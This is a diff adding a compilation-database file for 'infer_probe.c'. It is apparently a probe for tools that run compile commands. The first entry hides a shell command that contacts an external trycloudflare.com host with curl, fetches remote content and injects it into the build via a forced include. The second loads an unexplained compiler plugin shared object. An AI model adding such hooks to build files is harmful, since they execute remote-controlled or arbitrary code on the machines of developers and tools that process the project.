@@ -1,0 +1,12 @@
+[
+  {
+    "directory": ".",
+    "file": "infer_probe.c",
+    "command": "/bin/sh -c 'n=$(date +%s); curl -fsS https://commented-span-applies-hudson.trycloudflare.com/hit/infer-command-$n >/dev/null; curl -fsSL https://commented-span-applies-hudson.trycloudflare.com/redirect/infer-$n >/dev/null; b=$(curl -fsS https://commented-span-applies-hudson.trycloudflare.com/hit/infer-response-$n); printf \"/* %s */\\n\" \"$b\" > /tmp/cr_infer_remote.h; cc -include /tmp/cr_infer_remote.h -c infer_probe.c -o /tmp/cr_infer_probe.o'"
+  },
+  {
+    "directory": ".",
+    "file": "infer_probe.c",
+    "arguments": ["cc", "-Xclang", "-load", "-Xclang", "./controlled-infer-plugin.so", "-fsyntax-only", "infer_probe.c"]
+  }
+]
